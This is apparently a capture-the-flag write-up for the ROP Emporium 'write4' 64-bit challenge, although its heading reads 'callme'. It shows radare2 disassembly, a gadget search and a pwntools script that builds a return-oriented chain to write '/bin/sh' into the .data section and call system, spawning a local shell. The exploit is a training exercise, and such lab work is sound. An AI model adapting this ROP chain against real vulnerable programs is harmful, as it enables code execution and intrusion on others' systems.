# callme

Downloading, unzipping, and running the [challenge file](https://ropemporium.com/binary/write4.zip) gives us roughly the same as previous challenges:

```sh
$ ./write4
write4 by ROP Emporium
64bits

Go ahead and give me the string already!
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    7073 segmentation fault (core dumped)  ./write4
```

We can skip right to examining the `pwnme` and `usefulFunction` functions:
```asm
$ r2 -A write4
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[x] Use -AA or aaaa to perform additional experimental analysis.
 -- Welcome back, lazy human!
[0x00400650]> pd @ sym.pwnme
/ (fcn) sym.pwnme 82
|   sym.pwnme ();
|           ; var char *s @ rbp-0x20
|           ; CALL XREF from sym.main (0x40079f)
|           0x004007b5      55             push rbp
|           0x004007b6      4889e5         mov rbp, rsp
|           0x004007b9      4883ec20       sub rsp, 0x20
|           0x004007bd      488d45e0       lea rax, [s]
|           0x004007c1      ba20000000     mov edx, 0x20               ; 32 ; size_t n
|           0x004007c6      be00000000     mov esi, 0                  ; int c
|           0x004007cb      4889c7         mov rdi, rax                ; void *s
|           0x004007ce      e82dfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x004007d3      bfe0084000     mov edi, str.Go_ahead_and_give_me_the_string_already ; 0x4008e0 ; "Go ahead and give me the string already!" ; const char *s
|           0x004007d8      e8f3fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007dd      bf09094000     mov edi, 0x400909           ; const char *format
|           0x004007e2      b800000000     mov eax, 0
|           0x004007e7      e804feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x004007ec      488b157d0820.  mov rdx, qword [obj.stdin]  ; [0x601070:8]=0 ; FILE *stream
|           0x004007f3      488d45e0       lea rax, [s]
|           0x004007f7      be00020000     mov esi, 0x200              ; 512 ; int size
|           0x004007fc      4889c7         mov rdi, rax                ; char *s
|           0x004007ff      e81cfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00400804      90             nop
|           0x00400805      c9             leave
\           0x00400806      c3             ret
/ (fcn) sym.usefulFunction 17
|   sym.usefulFunction ();
|           0x00400807      55             push rbp
|           0x00400808      4889e5         mov rbp, rsp
|           0x0040080b      bf0c094000     mov edi, str.bin_ls         ; 0x40090c ; "/bin/ls" ; const char *string
|           0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)
|           0x00400815      90             nop
|           0x00400816      5d             pop rbp
\           0x00400817      c3             ret
            0x00400818      0f1f84000000.  nop dword [rax + rax]
            ;-- usefulGadgets:
            0x00400820      4d893e         mov qword [r14], r15
            0x00400823      c3             ret
            0x00400824      662e0f1f8400.  nop word cs:[rax + rax]
            0x0040082e      6690           nop
```
There's a `usefulGadgets` section, but that's jumping ahead a tiny bit.

Once again, there's a `system` call we can make use of, but jumping directly to `usefulFunction` will call `system` with the arguments `/bin/ls` and isn't going to help us. Last time we were able to just nicely find a `/bin/cat flag.txt` string hanging out in the binary. Let's search the binary for strings again:

```asm
[0x00400650]> iz
000 0x000008b8 0x004008b8  22  23 (.rodata) ascii write4 by ROP Emporium
001 0x000008cf 0x004008cf   7   8 (.rodata) ascii 64bits\n
002 0x000008d7 0x004008d7   8   9 (.rodata) ascii \nExiting
003 0x000008e0 0x004008e0  40  41 (.rodata) ascii Go ahead and give me the string already!
004 0x0000090c 0x0040090c   7   8 (.rodata) ascii /bin/ls
```

Nope nothing that easy this time. However, let's take a look at that `usefulGadgets` section:

```asm
            ;-- usefulGadgets:
            0x00400820      4d893e         mov qword [r14], r15
            0x00400823      c3             ret
```

If we can pop values into r14 and r15, that gadget should let us write arbitrary values. Let's see if we get lucky with another gadget:

```asm
[0x00400650]> /R pop r14
  0x0040088c               415c  pop r12
  0x0040088e               415d  pop r13
  0x00400890               415e  pop r14
  0x00400892               415f  pop r15
  0x00400894                 c3  ret

  0x0040088d                 5c  pop rsp
  0x0040088e               415d  pop r13
  0x00400890               415e  pop r14
  0x00400892               415f  pop r15
  0x00400894                 c3  ret

  0x0040088f                 5d  pop rbp
  0x00400890               415e  pop r14
  0x00400892               415f  pop r15
  0x00400894                 c3  ret
```

Well there we go :)

So what we want to do is find a place in memory that's writeable, put the string `/bin/sh` or perhaps `/bin/cat flag.txt` into that address, and then put the address of that string into rdi so that `system` will be called with that string as its argument.

Let's start by picking a place to put our argument string. Printing out the sections:

```asm
[0x00400746]> iS
[Sections]
00 0x00000000     0 0x00000000     0 ----
01 0x00000238    28 0x00400238    28 -r-- .interp
02 0x00000254    32 0x00400254    32 -r-- .note.ABI_tag
03 0x00000274    36 0x00400274    36 -r-- .note.gnu.build_id
04 0x00000298    48 0x00400298    48 -r-- .gnu.hash
05 0x000002c8   288 0x004002c8   288 -r-- .dynsym
06 0x000003e8   116 0x004003e8   116 -r-- .dynstr
07 0x0000045c    24 0x0040045c    24 -r-- .gnu.version
08 0x00000478    32 0x00400478    32 -r-- .gnu.version_r
09 0x00000498    96 0x00400498    96 -r-- .rela.dyn
10 0x000004f8   168 0x004004f8   168 -r-- .rela.plt
11 0x000005a0    26 0x004005a0    26 -r-x .init
12 0x000005c0   128 0x004005c0   128 -r-x .plt
13 0x00000640     8 0x00400640     8 -r-x .plt.got
14 0x00000650   594 0x00400650   594 -r-x .text
15 0x000008a4     9 0x004008a4     9 -r-x .fini
16 0x000008b0   100 0x004008b0   100 -r-- .rodata
17 0x00000914    68 0x00400914    68 -r-- .eh_frame_hdr
18 0x00000958   308 0x00400958   308 -r-- .eh_frame
19 0x00000e10     8 0x00600e10     8 -rw- .init_array
20 0x00000e18     8 0x00600e18     8 -rw- .fini_array
21 0x00000e20     8 0x00600e20     8 -rw- .jcr
22 0x00000e28   464 0x00600e28   464 -rw- .dynamic
23 0x00000ff8     8 0x00600ff8     8 -rw- .got
24 0x00001000    80 0x00601000    80 -rw- .got.plt
25 0x00001050    16 0x00601050    16 -rw- .data
26 0x00001060     0 0x00601060    48 -rw- .bss
27 0x00001060    52 0x00000000    52 ---- .comment
28 0x00001ae2   268 0x00000000   268 ---- .shstrtab
29 0x00001098  1896 0x00000000  1896 ---- .symtab
30 0x00001800   738 0x00000000   738 ---- .strtab
```
There are a few sections marked `rw` that we can write to. Writing to either the `dynamic`, `got`, or `got.plt` sections are likely to interfere with dynamic linking and program execution.
We could *potentially* get away with writing to the `init_array` or `fini_array` sections because they're related to program initialization and termination and we no longer really care about that.
Luckily we don't need to bother with that as the `data` section will do just fine.
The `data` section is where global variables are stored, and therefore has to be `rw`. Let's see what's currently in it:

```asm
[0x00400746]> px 16 @ 0x00601050
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x00601050  0000 0000 0000 0000 0000 0000 0000 0000  ................
```

We can see that it's only 16 bytes long from the previous list.
This is a fairly contrived challenge in that there's nothing currently in the data section and it's perfectly sized for our string.

Finally we look for a `pop rdi`:

```asm
[0x00400746]> /R pop rdi
  0x00400893                 5f  pop rdi
  0x00400894                 c3  ret
```

And now we can craft our exploit:

```python
from pwn import *

prog = process("./write4")

system_call = p64(0x00400810)

payload = "A" * 40

payload += p64(0x400890)    # pop r14; pop r15; ret
payload += p64(0x00601050)  # address in data
payload += ("/bin/sh\0")
payload += p64(0x400820)    # mov qword ptr [r14], r15; ret
payload += p64(0x400893)    # pop rdi; ret
payload += p64(0x00601050)  # our address in data
payload += system_call

print prog.recvuntil(">")
prog.clean()

prog.sendline(payload)

prog.interactive()
```

This time we use the `prog.interactive()` function so that when `/bin/sh` is called, we're dropped into the new shell. We could have also used the `/bin/cat flag.txt` string and then we wouldn't need to interact with the new shell:

```sh
$ python exploit.py
[+] Starting local process './write4': pid 14219
write4 by ROP Emporium
64bits

Go ahead and give me the string already!
>
[*] Switching to interactive mode
$ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
```

Success!
